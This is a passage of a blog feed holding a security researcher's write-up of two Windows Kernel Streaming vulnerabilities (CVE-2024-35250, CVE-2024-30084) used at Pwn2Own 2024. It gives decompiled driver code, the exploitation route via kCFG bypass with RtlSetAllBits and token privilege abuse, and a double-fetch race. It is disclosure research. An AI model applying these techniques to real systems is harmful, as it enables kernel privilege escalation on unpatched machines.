&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
&lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CKSThunkDevice&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DispatchIoctl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CKernelFilterDevice&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IRP&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;irp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NTSTATUS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IoIs32bitProcess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;irp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;irp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RequestorMode&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//------[3]&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
   &lt;span class=&quot;c1&quot;&gt;//Convert 32-bit requests to 64-bit requests&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CurrentStackLocation&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Parameters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DeviceIoControl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IoControlCode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IOCTL_KS_PROPERTY&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CKSThunkDevice&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CheckIrpForStackAdjustmentNative&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;irp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//-----[4];&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;You can see that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk&lt;/code&gt; will first determine whether the request is from a WoW64 Process. If it is, it will convert the original 32-bit Requests into 64-bit at [3]. If the original request is already 64-bit, it will call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CKSThunkDevice::CheckIrpForStackAdjustmentNative&lt;/code&gt; at [4] to pass it down.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CKSThunkDevice&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CheckIrpForStackAdjustmentNative&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;_IRP&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;irp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_OWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Type3InputBuffer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Set&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_OWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KSPROPSETID_DrmAudioStream&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type3inputbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Id&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type3inputbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Flags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;//-----[5]   &lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;irp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RequestorMode&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//-------[6]&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xC0000010&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;UserBuffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;irp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UserBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_QWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_QWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Type3InputBuffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x38&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))(&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;// call Type3InputBuffer+0x38&lt;/span&gt;
                &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UserBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                &lt;span class=&quot;mi&quot;&gt;0LL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//------------[7]&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; 
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can notice that if we give the property set as &lt;a href=&quot;https://learn.microsoft.com/mt-mt/windows-hardware/drivers/audio/kspropsetid-drmaudiostream&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPSETID_DrmAudioStream&lt;/code&gt;&lt;/a&gt;, there is additional processing at [5]. At [6], we can see that it first checks whether &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Irp-&amp;gt;RequestorMode&lt;/code&gt; is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KernelMode(0)&lt;/code&gt;. If it is called from user, it will directly return an error.&lt;/p&gt;

&lt;p&gt;It should be pretty obvious here that if we call IOCTL with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPERTY_TYPE_UNSERIALIZESET&lt;/code&gt; and specify the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPSETID_DrmAudioStream&lt;/code&gt; property, it will be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KernelMode(0)&lt;/code&gt; here. Additionally, it will directly use the input provided by the user as a function call at [7]. Even the first parameter is controllable.&lt;/p&gt;

&lt;p&gt;After writing the PoC, we confirmed our results.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Some people might wonder, under what device or situation would have &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPSETID_DrmAudioStream&lt;/code&gt;? Actually, most audio devices will have it, primarily used for setting DRM-related content.&lt;/p&gt;

&lt;h3 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h3&gt;
&lt;p&gt;Once arbitrary calls are achieved, accomplishing EoP is not too difficult. Although protections such as kCFG, kASLR, and SMEP will be encountered, the only protection that needs to be dealt with under Medium IL is kCFG.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;kCFG&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;kASLR
    &lt;ul&gt;
      &lt;li&gt;NtQuerySystemInformation&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;SMEP
    &lt;ul&gt;
      &lt;li&gt;Reuse Kernel Code&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;‚Ä¶&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;bypass-kcfg&quot;&gt;Bypass kCFG&lt;/h4&gt;
&lt;p&gt;Our goal here is straightforward: to create an arbitrary write primitive from a legitimate function, which can then be used to achieve EoP through typical methods like &lt;a href=&quot;https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/how-kernel-exploits-abuse-tokens-for-privilege-escalation#id-1.-replacing-tokens-for-privilege-escalation&quot;&gt;replacing the current process token with system token&lt;/a&gt; or &lt;a href=&quot;https://media.blackhat.com/bh-us-12/Briefings/Cerrudo/BH_US_12_Cerrudo_Windows_Kernal_Slides.pdf&quot;&gt;abusing the token privilege&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;It is intuitive to look directly for legitimate functions with names containing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;set&lt;/code&gt;, as they are more likely to do arbitrary writing.  We directly take the export functions from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ntoskrnl.exe&lt;/code&gt; to see if there are any good gadgets, as these functions are generally legitimate.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We quickly found &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlsetallbits&quot;&gt;RtlSetAllBits&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It is a very useful gadget and a legitimate function in kCFG. Additionally, it only requires controlling the first parameter &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_RTL_BITMAP&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;_RTL_BITMAP&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SizeOfBitMap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                               
    &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                                   
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt; 

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can assign the buffer to any address and specify the size, allowing us to set up a range of bits entirely. At this point, we are almost done. As long as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Token-&amp;gt;Privilege&lt;/code&gt; is fully set up, we can use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Abuse Privilege&lt;/code&gt; method to achieve EoP.&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/j1wzwXLxdVs?si=aKURBnYWXvbAaXin&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;p&gt;However, before the Pwn2Own event, we created a new Windows 11 23H2 VM on Hyper-V and ran the exploit. The result was a failure. It failed at the open device stage.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After investigation, we discovered that Hyper-V does not have an audio device by default, causing the exploit to fail.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In Hyper-V, only MSKSSRV is present by default. However, MSKSSRV does not have the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPSETID_DrmAudioStream&lt;/code&gt; property, which prevents us from successfully exploiting this EoP vulnerability. Therefore, we must find other ways to trigger it or discover new vulnerabilities. We decided to review the entire process again to see if there were any other exploitable vulnerabilities.&lt;/p&gt;

&lt;h3 id=&quot;cve-2024-30084&quot;&gt;CVE-2024-30084&lt;/h3&gt;
&lt;p&gt;After re-examining, it was found that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOCTL_KS_PROPERTY&lt;/code&gt; uses &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/using-neither-buffered-nor-direct-i-o&quot;&gt;Neither I/O&lt;/a&gt; to transmit data, which means it uses the input buffer for data processing directly. Generally speaking, this method is not recommended as it often leads to &lt;strong&gt;double fetch&lt;/strong&gt; issues.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;From the above figure of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KspPropertyHandler&lt;/code&gt;, we can see that after the user calls IOCTL, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Type3InputBuffer&lt;/code&gt; is directly copied into a newly allocated buffer, containing the &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/stream/ksproperty-structure&quot;&gt;KSPROPERTY&lt;/a&gt; structure. This GUID in the structure is then used to check if the property set exists in the device. If it does, it will proceed to call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UnserializePropertySet&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Let‚Äôs take another look at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UnserializePropertySet&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/31.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It &lt;strong&gt;once again copies the user-provided data from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Type3InputBuffer&lt;/code&gt;&lt;/strong&gt; as the input for the new IOCTL. Clearly, there exists a &lt;strong&gt;double fetch&lt;/strong&gt; vulnerability here, so we have modified the entire process, as shown in the following diagram.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/32.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When we initially send &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOCTL_KS_PROPERTY&lt;/code&gt;, we use the existing property  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPSETID_Service&lt;/code&gt; of MSKSSRV for subsequent operations. As shown in step 6 of the diagram, a copy of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPERTY&lt;/code&gt; is first made into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SystemBuffer&lt;/code&gt;, and then this property is used to check whether it is in the support list of the KS object. Since MSKSSRV supports it, it will then call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UnserializePropertySet&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/33.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After calling &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UnserializePropertySet&lt;/code&gt;, due to the double fetch vulnerability, we can change &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPSETID_Service&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPSETID_DrmAudioStream&lt;/code&gt; between the check and use phases. Subsequently, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPSETID_DrmAudioStream&lt;/code&gt; will be used as the request to send IOCTL, thereby triggering the CVE-2024-35250 mentioned above logic flaw. This makes the vulnerability exploitable in any environment.&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/xNUj_XZ9LhQ?si=ONmvl9_8BV-z0idL&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;p&gt;Finally, we successfully compromised Microsoft Windows 11 during Pwn2Own Vancouver 2024.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/34.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After the Pwn2Own event, our investigation revealed that this vulnerability has existed since Windows 7 for nearly 20 years. Moreover, it is highly reliable and has a 100% success rate in exploitation. We strongly recommend that everyone update to the latest version as soon as possible.&lt;/p&gt;

&lt;h2 id=&quot;to-be-continued&quot;&gt;To be continued&lt;/h2&gt;
&lt;p&gt;This article focuses on how we identified the vulnerabilities used in this year‚Äôs Pwn2Own and the attack surface analysis of Kernel Streaming. After discovering this vulnerability, we continued our research on this attack surface and found another exploitable vulnerability along with other interesting findings.&lt;/p&gt;

&lt;p&gt;Stay tuned for Part II, expected to be published in October of this year.&lt;/p&gt;

&lt;h2 id=&quot;reference&quot;&gt;Reference&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://securityintelligence.com/x-force/critically-close-to-zero-day-exploiting-microsoft-kernel-streaming-service/&quot;&gt;Critically Close to Zero-Day: Exploiting Microsoft Kernel Streaming Service&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://conference.hitb.org/hitbsecconf2023hkt/materials/D2T1%20-%20Windows%20Kernel%20Security%20-%20A%20Deep%20Dive%20into%20Two%20Exploits%20Demonstrated%20at%20Pwn2Own%20-%20Thomas%20Imbert.pdf&quot;&gt;Windows Kernel Security - A Deep Dive into Two Exploits Demonstrated at Pwn2Own&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://big5-sec.github.io/posts/CVE-2023-29360-analysis/&quot;&gt;CVE-2023-29360 Analysis&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://securityintelligence.com/x-force/little-bug-that-could/&quot;&gt;Racing Round and Round: The Little Bug That Could&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2019/03/windows-kernel-logic-bug-class-access.html&quot;&gt;Windows Kernel Logic Bug Class: Access Mode Mismatch in IO Manager&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2021/01/hunting-for-bugs-in-windows-mini-filter.html&quot;&gt;Hunting for Bugs in Windows Mini-Filter Drivers&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/blog/2019/03/local-privilege-escalation-via-the-windows-i-o-manager-a-variant-finding-collaboration/&quot;&gt;Local Privilege Escalation via the Windows I/O Manager: A Variant Finding &amp;amp; Collaboration&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
                <link>https://devco.re/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1-en/</link>
                <guid>https://devco.re/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1-en</guid>
                <pubDate>Fri, 23 Aug 2024 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server!</title>
                <description>&lt;h6 id=&quot;orange-tsai-orange_8361--ÁπÅÈ´î‰∏≠ÊñáÁâàÊú¨--english-version&quot;&gt;Orange Tsai (&lt;a href=&quot;https://x.com/orange_8361&quot;&gt;@orange_8361&lt;/a&gt;) ¬†|¬† &lt;a href=&quot;/blog/2024/08/09/confusion-attacks-exploiting-hidden-semantic-ambiguity-in-apache-http-server/&quot;&gt;ÁπÅÈ´î‰∏≠ÊñáÁâàÊú¨&lt;/a&gt; ¬†|¬† &lt;a href=&quot;/blog/2024/08/09/confusion-attacks-exploiting-hidden-semantic-ambiguity-in-apache-http-server-en/&quot;&gt;English Version&lt;/a&gt;&lt;/h6&gt;

&lt;style&gt;
    .language-plaintext {
        background-color: #f9f2f4;
    }

    .highlight {
        border-left: 2px solid #44D62C !important;
    }
&lt;/style&gt;

